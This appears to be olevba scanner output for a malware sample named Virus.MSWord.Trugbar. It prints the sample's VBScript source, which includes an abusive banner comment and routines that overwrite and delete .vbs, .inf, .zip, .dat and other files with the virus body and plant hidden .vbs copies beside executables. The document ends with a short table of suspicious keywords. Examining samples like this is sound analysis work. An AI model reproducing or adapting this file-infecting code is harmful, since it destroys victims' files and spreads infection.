olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trugbar
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Trugbar 
in file: Virus.MSWord.Trugbar - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem ------------------------------------------- 
Rem barok(Vbs.Trug.A) < Say, FUCKYOU there! >  
Rem == This is my reply for a discrimination == 
Rem ==   of Philippine Political Tradition   == 
Rem ------------------------------------------- 

' <!Trug Rundate: Nov 27, 2003 by Barad 

On Error Resume Next
Dim vBS, windeer, life, infct
Set vBS = CreateObject("Scripting.FileSystemObject")
Set life = vBS.OpenTextFile(Wscript.ScriptFullName, 1)
infct = life.ReadAll
main()

Sub main()
On Error Resume Next
Dim wscr, rr
Set windeer = vBS.GetSpecialFolder(0)
Set c = vBS.GetFile(Wscript.ScriptFullname)
listadriv
End Sub

Sub listadriv()
On Error Resume Next
Dim d, dc, s
Set dc = vBS.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
End If
Next
listadriv = s
End Sub

Sub infectfiles(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, ap, s, bname, mp3
Set f = vBS.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = vBS.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "vbs") Then
Set ap = vBS.OpenTextFile(f1.Path, 2, True)
ap.write infct
ap.Close
ElseIf (ext = "vxd") Or (ext = "drv") Or (ext = "inf") Then
Set ap = vBS.OpenTextFile(f1.Path, 2, True)
ap.write infct
ap.Close
bname = vBS.GetBaseName(f1.Path)
Set cop = vBS.GetFile(f1.Path)
cop.Copy(folderspec&"\"&bname&".vbs") 
Obj.DeleteFile (f1.Path)
ElseIf (ext = "cab") Or (ext = "zip") Or (ext= "dat") Then
Set ap = vBS.OpenTextFile(f1.Path, 2, True)
ap.write infct
ap.Close
Set cop = vBS.GetFile(f1.Path)
cop.Copy (f1.Path&".vbs")
vBS.DeleteFile (f1.Path)
ElseIf (ext = "com") Or (ext = "exe") Or (ext = "dll") Then
Set mp3 = Obj.CreateTextFile(f1.Path & ".vbs")
mp3.write infct
mp3.Close
Set att = vBS.GetFile(f1.Path)
att.Attributes = att.Attributes + 2
End If
Next
End Sub

Sub folderlist(folderspec)
On Error Resume Next
Dim f, f1, sf
Set f = vBS.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
infectfiles (f1.Path)
folderlist (f1.Path)
Next
End Sub

Function fileexist(filespec)
On Error Resume Next
Dim msg
If (vBS.FileExists(filespec)) Then
msg = 0
Else
msg = 1
End If
fileexist = msg
End Function

Function folderexist(folderspec)
On Error Resume Next
Dim msg
If (vBS.GetFolderExists(folderspec)) Then
msg = 0
Else
msg = 1
End If
fileexist = msg
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|CreateObject        |May create an OLE object                     |
+----------+--------------------+---------------------------------------------+

